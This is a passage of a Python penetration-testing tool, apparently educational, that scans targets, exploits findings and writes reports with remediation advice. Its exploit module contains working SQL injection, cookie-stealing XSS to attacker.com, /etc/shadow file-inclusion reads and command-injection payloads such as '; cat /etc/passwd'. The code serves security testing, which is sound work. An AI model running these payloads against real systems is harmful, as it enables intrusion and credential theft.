                            evidence=f"No weak credentials found in {tested_count} attempts",
                            cwe_id="CWE-521",
                            cvss_score=0.0,
                            owasp_category="A07:2021 - Identification and Authentication Failures",
                            confidence="medium",
                            risk_score=0.0,
                            attack_vector="Network",
                            impact="Login form appears to resist basic dictionary attacks",
                            remediation="Continue monitoring for authentication security"
                        )
                        findings.append(finding)

            except Exception as e:
                logger.debug(f"Error testing brute force on {path}: {e}")

        return findings


class ExploitEngine:
    """Handles vulnerability exploitation for proof-of-concept"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'PenTest-Educational-Scanner/1.0'
        })
        self.session.verify = False

    def exploit_findings(self, findings: List[PentestFinding]) -> List[PentestFinding]:
        """Attempt to exploit discovered vulnerabilities for proof-of-concept"""
        exploited_findings = []

        for finding in findings:
            try:
                if finding.cwe_id == "CWE-89":  # SQL Injection
                    exploited = self._exploit_sql_injection(finding)
                elif finding.cwe_id == "CWE-79":  # XSS
                    exploited = self._exploit_xss(finding)
                elif finding.cwe_id == "CWE-22":  # File Inclusion
                    exploited = self._exploit_file_inclusion(finding)
                elif finding.cwe_id == "CWE-78":  # Command Injection
                    exploited = self._exploit_command_injection(finding)
                else:
                    exploited = finding

                exploited_findings.append(exploited)

            except Exception as e:
                logger.debug(f"Error exploiting finding: {e}")
                exploited_findings.append(finding)

        return exploited_findings

    def _exploit_sql_injection(self, finding: PentestFinding) -> PentestFinding:
        """Attempt to exploit SQL injection for data extraction"""
        try:
            if finding.payload and finding.target:
                # Try to extract database version
                version_payloads = [
                    "' UNION SELECT version()--",
                    "' UNION SELECT sqlite_version()--",
                    "' UNION SELECT @@version--"
                ]

                for payload in version_payloads:
                    response = self.session.get(finding.target,
                                                params={'id': payload}, timeout=10)

                    # Look for version information in response
                    version_patterns = [
                        r'SQLite \d+\.\d+\.\d+',
                        r'MySQL \d+\.\d+\.\d+',
                        r'PostgreSQL \d+\.\d+'
                    ]

                    for pattern in version_patterns:
                        match = re.search(pattern, response.text)
                        if match:
                            finding.exploitation_proof = f"Database version extracted: {match.group()}"
                            finding.evidence += f" | Exploited: {match.group()}"
                            break

        except Exception as e:
            logger.debug(f"Error exploiting SQL injection: {e}")

        return finding

    def _exploit_xss(self, finding: PentestFinding) -> PentestFinding:
        """Attempt to exploit XSS for session information"""
        try:
            if finding.payload and finding.target:
                # Create a payload that would extract cookie information
                cookie_payload = "<script>document.location='http://attacker.com/steal?'+document.cookie</script>"

                response = self.session.get(finding.target,
                                            params={'q': cookie_payload}, timeout=10)

                if cookie_payload in response.text:
                    finding.exploitation_proof = "XSS payload successfully reflected - cookie theft possible"
                    finding.evidence += " | Exploitable for session hijacking"

        except Exception as e:
            logger.debug(f"Error exploiting XSS: {e}")

        return finding

    def _exploit_file_inclusion(self, finding: PentestFinding) -> PentestFinding:
        """Attempt to exploit file inclusion for additional file access"""
        try:
            if finding.payload and finding.target:
                # Try to read additional sensitive files
                sensitive_files = [
                    "/etc/shadow",
                    "/etc/hosts",
                    "/var/log/auth.log"
                ]

                for file_path in sensitive_files:
                    response = self.session.get(finding.target,
                                                params={'file': file_path}, timeout=10)

                    if "root:" in response.text or "localhost" in response.text:
                        finding.exploitation_proof = f"Additional file accessed: {file_path}"
                        finding.evidence += f" | Can access: {file_path}"
                        break

        except Exception as e:
            logger.debug(f"Error exploiting file inclusion: {e}")

        return finding

    def _exploit_command_injection(self, finding: PentestFinding) -> PentestFinding:
        """Attempt to exploit command injection for system information"""
        try:
            if finding.payload and finding.target:
                # Try to execute system information commands
                info_commands = [
                    "; uname -a",
                    "; cat /etc/passwd",
                    "; ps aux"
                ]

                for cmd in info_commands:
                    response = self.session.get(finding.target,
                                                params={'cmd': cmd}, timeout=10)

                    if "Linux" in response.text or "root:" in response.text:
                        finding.exploitation_proof = f"System command executed: {cmd}"
                        finding.evidence += f" | Command executed: {cmd}"
                        break

        except Exception as e:
            logger.debug(f"Error exploiting command injection: {e}")

        return finding


class PenetrationTester:
    """Main penetration testing orchestrator"""

    def __init__(self):
        self.recon_engine = ReconnaissanceEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.exploit_engine = ExploitEngine()
        self.tools_available = self._check_tool_availability()

    def _check_tool_availability(self) -> Dict[str, bool]:
        """Check which penetration testing tools are available"""
        tools = {
            'nmap': self._command_exists('nmap'),
            'gobuster': self._command_exists('gobuster'),
            'nikto': self._command_exists('nikto'),
            'sqlmap': self._command_exists('sqlmap'),
            'dirb': self._command_exists('dirb'),
            'curl': self._command_exists('curl')
        }

        logger.info(
            f"Available tools: {[tool for tool, available in tools.items() if available]}")
        return tools

    def _command_exists(self, command: str) -> bool:
        """Check if a command exists in the system PATH"""
        try:
            subprocess.run([command, '--help'],
                           capture_output=True, timeout=5, check=False)
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def conduct_penetration_test(self,
                                 target: str,
                                 test_types: List[str] = None,
                                 deep_test: bool = False,
                                 exploit_mode: bool = False) -> PentestReport:
        """
        Conduct comprehensive penetration test

        Args:
            target: Target URL or IP address
            test_types: Types of tests to run ['recon', 'vuln_scan', 'web_app', 'all']
            deep_test: Whether to perform deep/thorough testing
            exploit_mode: Whether to attempt exploitation for proof-of-concept

        Returns:
            PentestReport containing all findings and metadata
        """

        start_time = time.time()
        all_findings = []
        tools_used = []
        methodology = []

        logger.info(f"Starting penetration test of: {target}")

        # Parse target to determine if it's a URL or IP
        if not target.startswith(('http://', 'https://')):
            # Assume it's an IP or hostname, try HTTP first
            target_url = f"http://{target}"
            target_ip = target
        else:
            target_url = target
            target_ip = urlparse(target).hostname

        # Initialize counters
        total_tests = 0
        successful_exploits = 0
        services_discovered = 0
        endpoints_tested = 0

        # Determine test types
        if test_types is None:
            test_types = ['recon', 'vuln_scan'] if not deep_test else ['all']

        # Phase 1: Reconnaissance
        if 'recon' in test_types or 'all' in test_types:
            logger.info("Phase 1: Reconnaissance and Information Gathering")
            methodology.append("Information Gathering")

            # Port scanning
            recon_findings = self.recon_engine.port_scan(target_ip)
            all_findings.extend(recon_findings)
            services_discovered = len([f for f in recon_findings if f.port])

            if recon_findings:
                tools_used.append('port_scanner')
                total_tests += len(recon_findings)

            # Service enumeration on discovered ports
            open_ports = [f.port for f in recon_findings if f.port]
            for port in open_ports[:5]:  # Limit to top 5 ports
                service_findings = self.recon_engine.service_enumeration(
                    target_ip, port)
                all_findings.extend(service_findings)
                total_tests += len(service_findings)

            if any(f.tool == "banner_grabbing" for f in all_findings):
                tools_used.append('service_enumeration')

            # Directory enumeration for web services
            if any(port in [80, 443, 8000, 8080, 8443, 9090, 5000] for port in open_ports):
                dir_findings = self.recon_engine.directory_enumeration(
                    target_url)
                all_findings.extend(dir_findings)
                endpoints_tested = len(
                    [f for f in dir_findings if f.tool in ['gobuster', 'custom_enum']])

                if dir_findings:
                    tools_used.append('directory_enumeration')
                    total_tests += len(dir_findings)

        # Phase 2: Vulnerability Scanning
        if 'vuln_scan' in test_types or 'web_app' in test_types or 'all' in test_types:
            logger.info("Phase 2: Vulnerability Assessment")
            methodology.append("Vulnerability Assessment")

            # Web application vulnerability scanning
            web_findings = self.vulnerability_scanner.scan_web_vulnerabilities(
                target_url)
            all_findings.extend(web_findings)
            total_tests += len(web_findings)

            if web_findings:
                tools_used.append('vulnerability_scanner')

            # External tool scanning (nikto)
            if self.tools_available.get('nikto') and deep_test:
                nikto_findings = self._run_nikto(target_url)
                all_findings.extend(nikto_findings)

                if nikto_findings:
                    tools_used.append('nikto')
                    total_tests += len(nikto_findings)

        # Phase 3: Exploitation (if enabled)
        if exploit_mode and ('exploit' in test_types or 'all' in test_types):
            logger.info("Phase 3: Exploitation and Proof-of-Concept")
            methodology.append("Exploitation")

            # Attempt to exploit discovered vulnerabilities
            exploitable_findings = [
                f for f in all_findings if f.severity in ['critical', 'high']]

            if exploitable_findings:
                exploited_findings = self.exploit_engine.exploit_findings(
                    exploitable_findings)

                # Replace original findings with exploited versions
                for i, finding in enumerate(all_findings):
                    for exploited in exploited_findings:
                        if (finding.title == exploited.title and
                                finding.target == exploited.target):
                            all_findings[i] = exploited
                            if exploited.exploitation_proof:
                                successful_exploits += 1
                            break

                if successful_exploits > 0:
                    tools_used.append('exploit_engine')

        # Generate summary and recommendations
        test_duration = time.time() - start_time
        summary = self._generate_summary(all_findings)
        recommendations = self._generate_recommendations(all_findings)

        report = PentestReport(
            target=target,
            test_duration=test_duration,
            timestamp=datetime.now().isoformat(),
            findings=all_findings,
            tools_used=list(set(tools_used)),
            total_tests=total_tests,
            successful_exploits=successful_exploits,
            services_discovered=services_discovered,
            endpoints_tested=endpoints_tested,
            summary=summary,
            methodology=methodology,
            recommendations=recommendations
        )

        logger.info(
            f"Penetration test completed in {test_duration:.2f} seconds")
        logger.info(f"Found {len(all_findings)} security issues")
        logger.info(
            f"Successfully exploited {successful_exploits} vulnerabilities")

        return report

    def _run_nikto(self, target_url: str) -> List[PentestFinding]:
        """Run nikto web vulnerability scanner"""
        findings = []

        try:
            cmd = ['nikto', '-h', target_url, '-Format', 'csv']
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=120)

            if result.returncode == 0 and result.stdout:
                lines = result.stdout.split('\n')
                for line in lines[1:]:  # Skip header
                    if line.strip():
                        parts = line.split('","')
                        if len(parts) >= 5:
                            finding = PentestFinding(
                                tool="nikto",
                                severity="medium",
                                title="Nikto Finding",
                                description=parts[4].strip('"') if len(
                                    parts) > 4 else "Web vulnerability detected",
                                target=target_url,
                                evidence=line.strip(),
                                confidence="medium",
                                attack_vector="Network",
                                impact="Potential security vulnerability"
                            )
                            findings.append(finding)

        except subprocess.TimeoutExpired:
            logger.warning("Nikto scan timed out")
        except Exception as e:
            logger.error(f"Error running nikto: {e}")

        return findings

    def _generate_summary(self, findings: List[PentestFinding]) -> Dict[str, Any]:
        """Generate test summary statistics"""
        severity_counts = {'critical': 0, 'high': 0,
                           'medium': 0, 'low': 0, 'info': 0}
        cwe_counts = {}
        owasp_counts = {}

        for finding in findings:
            # Count by severity
            severity_counts[finding.severity] += 1

            # Count by CWE
            if finding.cwe_id:
                cwe_counts[finding.cwe_id] = cwe_counts.get(
                    finding.cwe_id, 0) + 1

            # Count by OWASP category
            if finding.owasp_category:
                owasp_counts[finding.owasp_category] = owasp_counts.get(
                    finding.owasp_category, 0) + 1

        # Calculate risk score
        risk_score = self._calculate_risk_score(severity_counts)

        return {
            'total_findings': len(findings),
            'severity_distribution': severity_counts,
            'cwe_distribution': cwe_counts,
            'owasp_distribution': owasp_counts,
            'overall_risk_score': risk_score,
            'risk_level': self._get_risk_level(risk_score)
        }

    def _calculate_risk_score(self, severity_counts: Dict[str, int]) -> float:
        """Calculate overall risk score based on findings"""
        weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 2, 'info': 1}

        total_score = sum(severity_counts[severity] * weight
                          for severity, weight in weights.items())
        max_possible = sum(severity_counts.values()) * weights['critical']

        return (total_score / max_possible * 100) if max_possible > 0 else 0

    def _get_risk_level(self, risk_score: float) -> str:
        """Determine risk level based on score"""
        if risk_score >= 80:
            return "CRITICAL"
        elif risk_score >= 60:
            return "HIGH"
        elif risk_score >= 40:
            return "MEDIUM"
        elif risk_score >= 20:
            return "LOW"
        else:
            return "MINIMAL"

    def _generate_recommendations(self, findings: List[PentestFinding]) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []

        # Check for critical vulnerabilities
        critical_findings = [f for f in findings if f.severity == 'critical']
        if critical_findings:
            recommendations.append(
                "IMMEDIATE ACTION: Address all critical vulnerabilities within 24-48 hours")

        # Check for common vulnerability patterns
        vuln_types = {f.cwe_id for f in findings if f.cwe_id}

        if 'CWE-89' in vuln_types:
            recommendations.append(
                "Implement parameterized queries to prevent SQL injection")

        if 'CWE-79' in vuln_types:
            recommendations.append(
                "Implement proper input validation and output encoding for XSS prevention")

        if 'CWE-22' in vuln_types:
            recommendations.append(
                "Implement proper file access controls and input validation")

        if 'CWE-78' in vuln_types:
            recommendations.append(
                "Avoid system command execution or implement strict input validation")

        if any(f.title.lower().find('header') != -1 for f in findings):
            recommendations.append(
                "Implement security headers (CSP, HSTS, X-Frame-Options, etc.)")

        if any(f.title.lower().find('default') != -1 for f in findings):
            recommendations.append(
                "Change all default credentials and implement strong password policies")

        # General recommendations
        recommendations.extend([
            "Conduct regular security assessments and penetration testing",
            "Implement security monitoring and incident response procedures",
            "Provide security awareness training for development team",
            "Establish secure development lifecycle (SDLC) practices"
        ])

        return recommendations


# Convenience functions for direct usage
def pentest_application(target: str, deep_test: bool = False) -> PentestReport:
    """Quick penetration test of an application"""
    tester = PenetrationTester()
    return tester.conduct_penetration_test(target, deep_test=deep_test)


def pentest_demo_applications(educational: bool = True) -> Dict[str, PentestReport]:
    """Penetration test all demo applications"""
    # Application endpoints (assuming they're running)
    demo_apps = {
        'vulnerable-flask-app': 'http://localhost:5000',
        'unsecure-pwa': 'http://localhost:5000',  # Adjust port as needed
        'vulnerable-nodejs-app': 'http://localhost:3000'
    }

    tester = PenetrationTester()
    results = {}

    for app_name, url in demo_apps.items():
        try:
            logger.info(f"Penetration testing {app_name} at {url}")

            # Check if application is accessible
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                report = tester.conduct_penetration_test(
                    url,
                    test_types=['all'],
                    deep_test=True,
                    exploit_mode=educational
                )
                results[app_name] = report
            else:
                logger.warning(f"{app_name} not accessible at {url}")

        except requests.exceptions.RequestException as e:
            logger.warning(f"Could not connect to {app_name} at {url}: {e}")
            logger.info(
                f"Make sure {app_name} is running before performing penetration testing")

    return results


if __name__ == "__main__":
    # Example usage
    import sys

    if len(sys.argv) > 1:
        target = sys.argv[1]
        tester = PenetrationTester()

        # Determine test parameters
        deep_test = '--deep' in sys.argv
        exploit_mode = '--exploit' in sys.argv

        report = tester.conduct_penetration_test(
            target,
            test_types=['all'],
            deep_test=deep_test,
            exploit_mode=exploit_mode
        )

        print(f"Penetration Test Report for: {target}")
        print(f"Total findings: {report.summary['total_findings']}")
        print(f"Risk level: {report.summary['risk_level']}")
        print(
            f"Critical: {report.summary['severity_distribution']['critical']}")
        print(f"High: {report.summary['severity_distribution']['high']}")
        print(f"Medium: {report.summary['severity_distribution']['medium']}")

        for finding in report.findings[:5]:  # Show first 5 findings
            print(f"\n[{finding.severity.upper()}] {finding.title}")
            print(f"  Tool: {finding.tool}")
            print(f"  Target: {finding.target}")
            print(f"  Description: {finding.description[:100]}...")
            if finding.exploitation_proof:
                print(f"  Exploitation: {finding.exploitation_proof}")
    else:
        print("Usage: python penetration_analyzer.py <target_url>")
        print("Options: --deep (thorough testing), --exploit (attempt exploitation)")
        print(
            "Example: python penetration_analyzer.py http://localhost:5000 --deep --exploit")
